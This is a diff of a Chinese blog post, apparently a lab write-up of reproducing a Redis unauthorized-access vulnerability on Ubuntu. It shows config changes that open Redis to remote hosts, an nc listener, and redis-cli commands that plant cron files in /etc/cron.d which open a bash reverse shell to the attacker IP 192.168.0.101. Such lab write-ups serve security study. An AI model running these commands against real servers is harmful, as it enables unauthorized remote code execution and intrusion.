@@ -112,7 +112,7 @@
 <meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180822/g09I15ABF0.png?imageslim">
 <meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180822/8gBjG01E3f.png?imageslim">
 <meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180822/LHC200k4jh.png?imageslim">
-<meta property="og:updated_time" content="2018-08-22T09:40:14.936Z">
+<meta property="og:updated_time" content="2018-08-24T17:06:41.828Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="记一次失败漏洞利用的经历--ubuntu下的redis未授权访问漏洞复现">
 <meta name="twitter:description" content="记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现由于redis的配置不当导致攻击者可以利用该未授权访问漏洞去对服务器进行攻击，redis服务默认端口为6379端口，在利用该漏洞的时候，由于服务器是ubuntu的原因，遇到了不少坑导致最终并没有利用成功，不像之前在centos环境下利用该漏洞时那样顺利，所以在这里记录一下。在理解这篇文章之前，可以先参考一下之前的解决ubuntu">
@@ -372,10 +372,10 @@
 <h3 id="漏洞环境及搭建"><a href="#漏洞环境及搭建" class="headerlink" title="漏洞环境及搭建"></a>漏洞环境及搭建</h3><p><strong>ubuntu16.04（192.168.0.107）：安装了redis服务的靶机,作为redis-server</strong></p>
 <p><strong>kali2.0（192.168.0.101）：攻击者机器，同样安装了redis，要使用redis-cli对未授权访问漏洞进行利用</strong></p>
 <p><strong>该实验中redis的版本为4.0.8，安装redis方法如下</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">wget http://download.redis.io/releases/redis-4.0.8.tar.gz</div><div class="line">tar –xvf redis-4.0.8.tar.gz</div><div class="line"><span class="built_in">cd</span> redis-4.0.8</div><div class="line">make</div></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">wget http://download.redis.io/releases/redis-4.0.8.tar.gz</div><div class="line">tar –xvf redis-4.0.8.tar.gz</div><div class="line"><span class="built_in">cd</span> redis-4.0.8</div><div class="line">make</div><div class="line">make install（加入到用户环境变量/usr/<span class="built_in">local</span>/bin）</div></pre></td></tr></table></figure>
 <p><strong>ubuntu安装完redis后，还需要修改redis配置文件redis.conf里面的几个地方</strong></p>
-<pre><code>1.bind 127.0.0.1前面需要加上注释符
-2.protected-mode要修改为no
+<pre><code>1.bind 127.0.0.1前面需要加上注释符，保证远程ip可以访问redis数据库
+2.protected-mode要修改为no，否则远程连接数据库的ip执行不了数据库语句
 </code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180816/HkF3EJj621.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180816/31fij0h7l1.png?imageslim" alt="mark"></p>
 <h3 id="尝试利用linux任务计划文件去反弹shell"><a href="#尝试利用linux任务计划文件去反弹shell" class="headerlink" title="尝试利用linux任务计划文件去反弹shell"></a>尝试利用linux任务计划文件去反弹shell</h3><p><strong>首先在ubuntu上开启redis服务</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> redis-4.0.8</div><div class="line">./src/redis-server redis.conf</div></pre></td></tr></table></figure>
@@ -400,7 +400,7 @@ command: 需要执行的命令
 <pre><code>/etc/crontab：该文件里面的任务计划可以直接执行
 /etc/cron.d/*：该目录下的任意文件都可以被当作任务计划去执行，并且避免了原先任务计划文件被覆盖的情况
 /var/spool/cron/crontabs/：该目录下定义的任务计划文件会被执行，不过需要有一个前提，就是该任务计划文件的权限必须为600
-</code></pre><p><strong>知道了以上的知识，可以通过redis未授权访问漏洞向ubuntu的<code>/etc/cron.d</code>目录下写任务计划文件去反弹shell,首先在kali上监听端口等待连接，我的思路是这样的，首先向/etc/cron.d下写一个任务计划文件step1，文件内容为<code>* * * * * root ln -s -f bash /bin/sh</code>，首先将ubuntu的cron的shell环境由dash改为bash，这样才可以使用交互式命令，之后再在<code>/etc/cron.d</code>目录下创建一个任务计划文件step2，内容为<code>* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.101/7777</code>,也就是使用交互式的bash去反弹shell到kali</strong></p>
+</code></pre><p><strong>知道了以上的知识，可以通过redis未授权访问漏洞向ubuntu的<code>/etc/cron.d</code>目录下写任务计划文件去反弹shell,首先在kali上监听端口等待连接，我的思路是这样的，首先向/etc/cron.d下写一个任务计划文件step1，文件内容为<code>* * * * * root ln -s -f bash /bin/sh</code>，首先将ubuntu的cron的shell环境由dash改为bash，这样才可以使用交互式命令，之后再在<code>/etc/cron.d</code>目录下创建一个任务计划文件step2，内容为<code>* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.101/7777 0&gt;&amp;1</code>,也就是使用交互式的bash去反弹shell到kali</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -nvlp 7777</div></pre></td></tr></table></figure>
 <p><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/bbl7Dm2Hea.png?imageslim" alt="mark"><br><strong>接下来在redis-cli命令行输入</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span> aaa <span class="string">"\n\n\n\n* * * * * root ln -s -f bash /bin/sh\n\n\n\n"</span></div><div class="line">config <span class="built_in">set</span> dir /etc/cron.d</div><div class="line">config <span class="built_in">set</span> dbfilename step1</div><div class="line">save</div><div class="line"><span class="built_in">set</span> bbb <span class="string">"\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.101/7777 0&gt;&amp;1\n\n\n\n"</span></div><div class="line">config <span class="built_in">set</span> dir /etc/cron.d</div><div class="line">config <span class="built_in">set</span> dbfilename step2</div><div class="line">save</div></pre></td></tr></table></figure>
@@ -562,7 +562,7 @@ command: 需要执行的命令
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">46</span>
+                  <span class="site-state-item-count">48</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -573,7 +573,7 @@ command: 需要执行的命令
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-count">18</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -584,7 +584,7 @@ command: 需要执行的命令
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-count">26</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
